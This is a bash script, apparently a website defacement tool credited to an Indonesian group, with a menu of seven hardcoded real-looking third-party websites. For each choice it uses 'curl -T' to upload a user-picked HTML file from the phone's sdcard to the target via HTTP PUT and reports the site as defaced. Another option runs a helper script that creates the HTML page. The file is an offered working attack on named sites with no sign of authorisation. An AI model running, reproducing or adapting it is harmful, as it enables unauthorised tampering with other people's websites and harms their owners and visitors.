blue="\033[34;1m"
green="\033[32;1m"
purple="\033[35;1m"
cyan="\033[36;1m"
red="\033[31;1m"
putih="\033[97;1m"
kuning="\033[93;1m"
pa="http://uzingela.co.za"
pu="http://thefoundation.co.za"
pe="http://techdirect.co.za"
pt="http://tieronecapital.co.za"
pk="http://totemafrica.com"
pl="http://ziady.com"
i="http://whadiz.com"

menu() {
read -p "Mau Deface Lagi? (y/n): " lgi
if [ $lgi = y ] || [ $lgi = Y ]
then
bash deface.sh
fi
if [ $lgi = n ] || [ $lgi = N ]
then
exit
fi
}

clear 
echo -e $purple"              ["$cyan"Powered By Executed Team"$purple"]"$putih 
echo -e "██████╗ ███████╗███████╗ █████╗  ██████╗███████╗██████╗ " 
echo -e "██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗" 
echo -e "██║  ██║█████╗  █████╗  ███████║██║     █████╗  ██████╔╝" 
echo -e "██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗" 
echo -e "██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗██║  ██║'" 
echo -e $red"╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝"$putih 
echo -e $red"        •"$kuning"•"$green"•"$putih" Created By AmmarBN & Fadhil "$green"•"$kuning"•"$red"•"$putih 
echo 
echo -e '['$green'•'$putih'] 1. http://uzingela.co.za' 
echo -e "["$red"•"$putih"] 2. http://thefoundation.co.za" 
echo -e "["$red"•"$putih"] 3. http://techdirect.co.za" 
echo -e "["$red"•"$putih"] 4. http://tieronecapital.co.za" 
echo -e "["$red"•"$putih"] 5. http://totemafrica.com" 
echo -e "["$red"•"$putih"] 6. http://ziady.com" 
echo -e "["$red"•"$putih"] 7. http://whadiz.com" 
echo -e "["$green"•"$putih"] 8. Create File HTML" 
echo 
read -p "Input Menu: " Next;  
if [ $Next = 1 ] || [ $Next = satu ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pa 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pa/$sc 
menu 
fi 
if [ $Next = 2 ] || [ $Next = dua ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pu 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pu/$sc 
menu 
fi 
if [ $Next = 3 ] || [ $Next = tiga ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pe 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pe/$sc 
menu 
fi 
if [ $Next = 4 ] || [ $Next = empat ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pt 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pt/$sc 
menu 
fi 
if [ $Next = 5 ] || [ $Next = lima ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pk 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pk/$sc 
menu 
fi 
if [ $Next = 6 ] || [ $Next = enam ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pl 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pl/$sc 
menu 
fi 
if [ $Next = 7 ] || [ $Next = tujuh ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $i 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $i/$sc 
menu 
fi 
if [ $Next = 8 ] || [ $Next = delapan ] 
then 
cd Data
bash create.sh
menu 
fi
